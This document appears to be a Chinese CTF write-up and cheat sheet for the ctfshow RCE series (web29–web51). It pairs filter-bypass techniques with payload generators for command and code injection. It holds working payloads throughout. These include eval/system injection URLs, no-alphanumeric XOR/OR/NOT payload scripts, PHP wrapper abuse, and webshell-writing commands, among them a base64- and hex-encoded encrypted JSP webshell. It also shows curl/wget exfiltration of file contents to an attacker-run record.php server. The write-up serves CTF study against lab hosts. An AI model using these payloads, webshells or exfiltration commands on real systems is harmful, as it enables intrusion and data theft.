# ctfshow_rce


ctfshow命令/代码执行专题

<!--more-->

## 总结：

## 文件读取可代替命令

```
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
rev:逆序查看
```

以及：

```
curl file:///flag
strings /flag
uniq -c/etc/passwd
bash -v /etc/passwd
rev /etc/passwd
```

## 空格绕过

```
<
<>				//重定向符
%20				//(space)
%09				//(tab)
$IFS$9 
${IFS}			//最好用这个
$IFS  
{cat,flag.txt} 	//在大括号中逗号可起分隔作用
```

## 编码绕过

Base64编码

```bash
[root@kali flag123]# echo 'cat' | base64
Y2F0Cg==
[root@kali flag123]# `echo 'Y2F0Cg==' | base64 -d` flag
flag{suifeng}
```

## 进制绕过

**16进制**

```bash
[root~]# echo cat flag.txt | xxd 
6361 7420 666c 6167 2e74 7874 0a
[root~]# echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p
cat flag.txt
[root~]# echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p | bash  或 | sh
flag{flag_is_here}
[root~]# $(printf "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")  //cat flag.txt 16进制
flag{flag_is_here}
```

**8进制**

```bash
[root~]# $(printf "\143\141\164\40\146\154\141\147\56\164\170\164")  
flag{flag_is_here}
```

## 分隔符过滤绕过

```
?>
||
%0a
```

## 符号绕过正则

单双引号

```
ca''t flag.txt
ca""t flag.txt
```

跨行符`'\'`

```
ca\t flag.txt
```

$*

```
ca$*t flag.txt
```

$@

```
ca$@t flag.txt
```

$x或${x}

```
ca$3t flag.txt
ca${3}t flag.txt
```

## 通配符绕过正则

```
shell通配符有：

* ：表示通配字符0次及以上
? : 表示通配字符0或
```

### 可以通配得到的命令

base64：

```
/bin/base64 可以通配为：
 
/???/????64
 
作用为将文件以base64编码形式输出
```

bzip2：

```
/usr/bin/bzip2 可以通配为：
 
/???/???/????2
 
作用为将文件压缩成后缀为bz2的压缩文件
flag.php ==>  flag.php.bz2
```

### 字符串通配

```
flag.php ==> flag.???
             flag*
             ……
```

还可以通配来匹配命令，但需要全路径

```
例如：
/bin/ca?
相当于cat命令
```

## 变量拼接绕过正则

```
以flag.php为例:
x=lag;cat f$x.php
相当于:
cat flag.php
```

## 输入字符串长度限制

```bash
[root@kali flag123]# cat flag
flag{suifeng}
[root@kali flag123]# touch "ag"
[root@kali flag123]# touch "fl\\"
[root@kali flag123]# touch "t \\"
[root@kali flag123]# touch "ca\\"
[root@kali flag123]# s -t
ca\ t \ fl\ ag shell flag
[root@kali flag123]# ls -t >shell
[root@kali flag123]# sh shell
shell: line 1: shell: command not found
flag{suifeng}
shell: line 6: flag: command not found
[root@kali flag123]# ls
ag ca\ fl  flag shell t \ 
```

```text
  #  \指的是换行
  #  ls -t是将文本按时间排序输出
  #  ls -t >shell  将输出输入到shell文件中
  #  sh将文本中的文字读取出来执行
```

## 内联执行

内联执行就是在一条shell语句中内嵌子shell语句,用主shell语句处理子语句的结果

可用于内联语句的符号 ${},``（反引号）

```
echo `ls`
echo ${ls}
相当于把ls的结果使用echo输出
```

## “${}”截取环境变量拼接

```bash
[root@kali ~]# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
[root@kali ~]# echo ${PATH:5:1}${PATH:2:1}
ls

${PATH:14:1}${PATH:5:1} flag.txt
在此环境中相当于 nl flag.txt
```

## []中括号匹配绕过

```
/[a-c][h-j][m-o]/[b-d]a[s-u] flag.txt
 
相当于
/bin/cat flag.txt
 
因为[]匹配范围只在当前路径
所以要为bin绝对路径
```

## source命令：

source命令，又称点命令,可以用点号( . ),代替

该命令可以读取并执行文件中的命令

可构建文件上传表单，上传命令文件执行

表单：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

get请求为：

```
?c=.+/???/????????[@-[]
 
一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）
```

## 嵌套eval函数绕过

```
?c=eval($_GET[a]);&a=system('cat flag.php');
```

```
payload共传递了两个参数，第一个为嵌套eval第二个为向嵌套的eval传入参数
```

## 已知的其他函数拼凑所需字符串

```
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
```

```
localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个"."
pos():输出数组第一个元素，不改变指针；
scandir();遍历目录，这里因为参数为"."所以遍历当前目录
array_reverse():元组倒置
next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
show_source():查看源码
```

**使用pos(localeconv)来获取小数点**

## **无回显rce**

无回显的执行函数：

```
exec()
shell_exec()
``（反引号）
```

这些需要php函数echo才可以输出结果

### 复制到可访问文件

```
先将根目录复制到某个文件，然后访问查看
ls /| tee ls.txt
 
然后输入 url/1.txt  即可查看根目录
```

```
再复制flag文件，然后访问查看
cat /flag.php | tee flag.txt
 
然后输入 url/falg.txt  即可查看根目录
```

```
还可以使用其他的复制方法
copy /flag.php flag.txt
 
mv /flag.php flag.txt
```

### dnslog外带数据

需要dnslog平台，可自己搭建

在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码

```
<?php
    $data =$_GET['data'];
    $f = fopen("flag.txt", "w");
    fwrite($f,$data);
    fclose($f);
    ?>
```

然后构造请求

```text
curl http://*.*.*.**/record.php?data=`catflag|base64`
wget http://*.*.*.*/record.php?data=`catflag|base64`
```

进行编码防止数据不全等问题

### >/dev/null 2>&1类无回显

用分隔符进行分割即可绕过



## uaf脚本绕过disable_function

具体脚本看web72

## 无字母数字RCE

### 异或

脚本生成包含所有可见字符的异或构造结果

```php
<?php
    $myfile = fopen("res.txt", "w");
    $contents="";
    for ($i=0; $i < 256; $i++) { 
      for ($j=0; $j <256 ; $j++) { 
    
        if($i<16){
          $hex_i='0'.dechex($i);
        }
        else{
          $hex_i=dechex($i);
        }
        if($j<16){
          $hex_j='0'.dechex($j);
        }
        else{
          $hex_j=dechex($j);
        }
        $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
              echo "";
        }
      
        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)^urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
          $contents=$contents.$c." ".$a." ".$b."\n";
        }
      }
    
    }
    }
    fwrite($myfile,$contents);
    fclose($myfile);
```

运行python脚本生成payload

```python
import requests
import urllib
from sys import *
import os
def action(arg):
       s1=""
       s2=""
       for i in arg:
           f=open("res.txt","r")
           while True:
               t=f.readline()
               if t=="":
                   break
               if t[0]==i:
                   #print(i)
                   s1+=t[2:5]
                   s2+=t[6:9]
                   break
           f.close()
       output="(\""+s1+"\"^\""+s2+"\")"
       return(output)
       
while True:
       param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
       print(param)
```

运行结果

```
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%04%09%09"^"%60%60%7b");
```

**低版本可能会导致执行不成功**

### 或

```php
<?php
    $myfile = fopen("res.txt", "w");
    $contents="";
    for ($i=0; $i < 256; $i++) { 
      for ($j=0; $j <256 ; $j++) { 
    
        if($i<16){
          $hex_i='0'.dechex($i);
        }
        else{
          $hex_i=dechex($i);
        }
        if($j<16){
          $hex_j='0'.dechex($j);
        }
        else{
          $hex_j=dechex($j);
        }
        $preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
              echo "";
        }
      
        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
          $contents=$contents.$c." ".$a." ".$b."\n";
        }
      }
    
    }
    }
    fwrite($myfile,$contents);
    fclose($myfile);
```

python脚本：

```python
import requests
import urllib
from sys import *
import os
def action(arg):
       s1=""
       s2=""
       for i in arg:
           f=open("or_rce.txt","r")
           while True:
               t=f.readline()
               if t=="":
                   break
               if t[0]==i:
                   #print(i)
                   s1+=t[2:5]
                   s2+=t[6:9]
                   break
           f.close()
       output="(\""+s1+"\"|\""+s2+"\")"
       return(output)
       
    while True:
       param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
       print(param)
```

### 取反

取反用的字符不会触发正则表达式，所以我们直接用php脚本生成payload即可

```
<?php  //在命令行中运行
    fwrite(STDOUT,'[+]your function: ');
    $system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
    fwrite(STDOUT,'[+]your command: ');
    $command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
    echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
    ?>

```



```bash
[root@kali html]# php test.php
[+]your function: system
[+]your command: dir
[*] (~%8C%86%8C%8B%9A%92)(~%9B%96%8D)；
```

## PHP封装协议

`?file=php://filter/read=convert.base64-encode/resource=config.php`它可以读取对应文件源代码，得到的结果经过Base64解密后得到的是config.php源代码

`?file=php://input` 写入PHP文件。它受限于allow_url_include选项。php://input可以读取没有处理过的POST数据

`?file=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=`，d2VsY29tZSB0byB0aGUgempjdGY=是welcome to the zjctf。它和`http://input`一样都可以把一些内容写入其中。

`file:///var/www/html/flag.php`读取本地文件，路径要是相对路径。可用于读取web目录下的文件。

## 写入webshell

确认寻找到的路径有写入权限之后，就可以开始写webshell了

### echo直接写入

#### **linux**

```
echo '<?php eval($_POST[2]); ?>' > 1.php
```

在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\47即可。

**写的时候要注意题目的函数是命令执行还是代码执行**

**注意payload里的符号**

![image-20230708194311172](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194311172.png)

蚁剑连接成功
![image-20230708194938060](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194938060.png)

#### **windows**

```
set /p=要写的内容<nul > C:\11.txt
echo 要写的内容 > C:\11.txt
```

在windows中，批处理需要转义字符主要有 “&”，“|”，“<”，“>”等等，转义字符为”^”

直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽


### 转换编码写入

#### Linux

**base64方式写入：**

```
echo "PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==" | base64 -d >2.php
```

**hex方式写入：**

hex写入与base64写入相似，在 https://www.107000.com/T-Hex/将webshell编码成hex，使用xxd命令还原

或在使用前将webshell使用xxd生成hex数据

```
echo '<?php eval($_POST[1]); ?>' |xxd -ps
```

然后命令注入执行

```
echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps > 3.php
```

#### windows

在windows中转换方法，是通过certutil进行转换。下面是base64以及hex的转换方式

**certutil-Base64**

```
echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= > 123.txt

再通过certuti进行解码
certutil -f -decode 111.txt C:\\111.jsp
```

**certutil-Hex**

```
echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e > 111.txt

再通过certuti进行解码
certutil -decodehex 111.txt C:\\111.jsp
```



## 靶场题目：

### [web29]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:26:48
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```



```
http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system('ls /');
```



```
http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system('ls /var/www/html/');
```

![image-20230701155039053](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155039053.png)

由于flag字符串被过滤了，正则当中`i`用来不区分大小写，则可以构造

```
http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system('tac /var/www/html/fla*.php');
```

![image-20230701155744635](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701155744635.png)

### [web30]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:42:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

system被过滤，可通过编码绕过，如`escape ascii with hex`
构造url如下：

```
http://b944f8f2-1f79-425e-a724-3be899d1b02c.challenge.ctf.show/?c="\163\171\163\164\145\155"('ls /');
```



```
http://b944f8f2-1f79-425e-a724-3be899d1b02c.challenge.ctf.show/?c="\163\171\163\164\145\155"('tac /var/www/html/fla*.ph*');
```

![image-20230701161713959](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701161713959.png)

### [web31]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

通过嵌套eval来绕过

```
http://d7fd57e8-f61b-48fb-90b9-457bc707aae9.challenge.ctf.show/?c=eval($_GET[1]);&1=system('tac /var/www/html/flag.php');
```

![image-20230701180852515](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701180852515.png)

### [web32~web36]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:56:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这次括号也被过滤了，include可以不用括号，分号可以用?>代替

```
http://15871fe9-df00-4f7b-8e90-3e2b3618b395.challenge.ctf.show/?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20230701185641589](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701185641589.png)

然后base64解码即可得到flag内容

**(web32~web36都可以用此payload)**

### [web37]文件包含

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

使用data伪协议(由于过滤了flag使用占位符) ?c=data://text/plain,

```
http://20afd377-c254-4c83-9656-761eccc0bda5.challenge.ctf.show/?c=data://text/palin,<?php system('tac fla?.php');?>
```

![image-20230701220839272](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701220839272.png)

### [web38]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:23:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

多过滤了php和file，可以继续使用data协议不过是base64编码或者用`<?= ?>`来代替php

```
http://3db62a04-22a9-4cf4-8990-684d55c8e05e.challenge.ctf.show/?c=data://text/palin,<?=system('tac fla?.???');?>
```

![image-20230701223040000](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230701223040000.png)

### [web39]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

在文件包含的时候会在后边加.php，使用web38的payload后边加上//就可以了

```
http://d0f68156-270b-4b09-9858-96cdfcb60a6f.challenge.ctf.show/?c=data://text/palin,<?=system('tac fla?.???');?>//
```

### [web40]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}

```

**payload1**

```
http://c8c8e348-2afc-4708-974f-6397d6a41122.challenge.ctf.show/?c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");
```

> `get_defined_vars()` 函数返回当前作用域中的所有已定义变量的数组。
>
> `reset()` 函数将数组指针重置为第一个元素，并返回该元素的值。
>
> `next()` 函数将指针移动到数组的下一个元素，并返回该元素的值。
>
> `eval()` 函数将返回的值作为字符串进行评估，即执行该字符串作为PHP代码。

![image-20230702131310303](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131310303.png)

 

**payload2**

```
http://c8c8e348-2afc-4708-974f-6397d6a41122.challenge.ctf.show/?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

> `localeconv()` 函数返回包含本地化设置的数组。
>
> `pos()` 函数返回数组的当前元素。
>
> `scandir()` 函数返回指定目录中的文件和目录列表。
>
> `array_reverse()` 函数将文件和目录列表按相反的顺序重新排列。
>
> `next()` 函数将指针移动到数组的下一个元素，并返回该元素的值。
>
> `highlight_file()` 函数接受返回的文件路径，并以HTML格式高亮显示该文件的内容。
>
> `echo` 语句将高亮显示的文件内容输出到浏览器。

![image-20230702131859477](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131859477.png)

### [web41]

过滤了基本上所有的可见字符，但没有过滤或运算符|和双引号”

可以使用或运算构造字符

这里也是直接用了佬写的脚本

通过修改脚本中的参数直接获取flag

```python
pythonimport re
import requests

url="http://8c9b5cd2-3f92-4451-a610-c30153b6063d.challenge.ctf.show/"

a=[]
ans1=""
ans2=""
for i in range(0,256):
    c=chr(i)
    tmp = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',c, re.I)
    if(tmp):
        continue
        #print(tmp.group(0))
    else:
        a.append(i)

# eval("echo($c);");
mya="system"  #函数名 这里修改！
myb="tac flag.php"      #参数
def myfun(k,my):
    global ans1
    global ans2
    for i in range (0,len(a)):
        for j in range(i,len(a)):
            if(a[i]|a[j]==ord(my[k])):
                ans1+=chr(a[i])
                ans2+=chr(a[j])
                return;
for k in range(0,len(mya)):
    myfun(k,mya)
data1="(\""+ans1+"\"|\""+ans2+"\")"
ans1=""
ans2=""
for k in range(0,len(myb)):
    myfun(k,myb)
data2="(\""+ans1+"\"|\""+ans2+"\")"

data={"c":data1+data2}
r=requests.post(url=url,data=data)
print(r.text)
```

![image-20230704014037894](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704014037894.png)

### [web42]

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 20:51:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

> `system($c." >/dev/null 2>&1");`: `system()` 函数用于执行操作系统命令。在这里，它执行了一个由变量$c组成的命令。`>/dev/null` 是一个重定向操作符，用于将命令输出重定向到空设备（即丢弃输出）。`2>&1` 是将标准错误输出重定向到与标准输出相同的位置。这样做的目的通常是隐藏命令的输出。

/dev/null 2>&1是不进行回显，所以采用命令把flag打印出来，利用；分隔分化一下 构造payload：

```
http://69d3026b-8d3d-465d-9e88-de78c94b2173.challenge.ctf.show/?c=tac flag.php;
```

![image-20230704015312035](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704015312035.png)

### [web43]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤的分号`;`和`cat`
过滤分号可以用`||`来绕过，也可以用`%0a`

构造payload：

```
http://86675d5f-84b3-463e-b502-aa45872d35e5.challenge.ctf.show/?c=tac flag*%0a
```

### [web44]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

payload:

```
http://74f7b3e3-07ef-4406-92ce-50ef4a1b36b2.challenge.ctf.show/?c=tac fla*%0a
```

### [web45]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:35:34
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

在之前的过滤基础上，把空格过滤了，所以可以采用“tab”但是直接按tab键会使光标跳到分隔符之后或者跳在历史记录中的下一条记录

所以采用tab的url编码`%09`

```
http://36a28485-8f30-45c2-8609-9961e849c7d9.challenge.ctf.show/?c=tac%09fla*||
```

### [web46]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

payload:

```
http://fbf393b9-61e3-424c-a868-ed9427f3231e.challenge.ctf.show/?c=tac%09fla%27%27g.php||
```

### [web47]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:59:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这次又多过滤了more，less，head，sort，tail

> more:一页一页的显示档案内容
> less:与 more 类似 head:查看头几行
> tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示
> tail:查看尾几行
> nl：显示的时候，顺便输出行号
> od:以二进制的方式读取档案内容
> vi:一种编辑器，这个也可以查看
> vim:一种编辑器，这个也可以查看
> sort:可以查看
> uniq:可以查看 
> file -f:报错出具体内容 
> grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings

payload：

```
http://25de6835-dd96-4a50-83af-50fa48cfa1f4.challenge.ctf.show/?c=tac%09fla?.php||
```

### [web48]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:06:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

payload：

```
http://fcd9b6a0-166f-483d-b987-2691fda042b2.challenge.ctf.show/?c=tac%09fla?.php||
```

[web49]跟48差不多

### [web50]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:32:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

payload:

```
http://14f16d04-b94e-4a71-81d9-0b3a691de2a9.challenge.ctf.show/?c=tac<fl''ag.php||
```

### [web51]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:42:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

又过滤了tac等，可以使用`ta‘’c`

payload：

```
